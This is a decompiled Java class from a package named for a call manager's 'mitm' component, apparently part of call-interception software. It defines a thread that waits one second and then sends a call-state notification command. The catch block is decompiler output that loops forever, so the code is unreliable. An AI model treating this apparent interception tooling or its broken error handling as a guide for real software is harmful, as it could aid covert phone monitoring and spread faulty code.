package com.vvt.callmanager.mitm;

import android.os.SystemClock;
import com.vvt.callmanager.ref.command.RemoteNotifyOnCallStateChanged;
import java.io.IOException;

class g
  extends Thread
{
  g(MitmManager paramMitmManager, RemoteNotifyOnCallStateChanged paramRemoteNotifyOnCallStateChanged) {}
  
  public void run()
  {
    long l = 1000L;
    SystemClock.sleep(l);
    try
    {
      RemoteNotifyOnCallStateChanged localRemoteNotifyOnCallStateChanged = this.a;
      localRemoteNotifyOnCallStateChanged.execute();
      return;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        boolean bool = MitmManager.d();
        if (!bool) {}
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/mitm/g.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */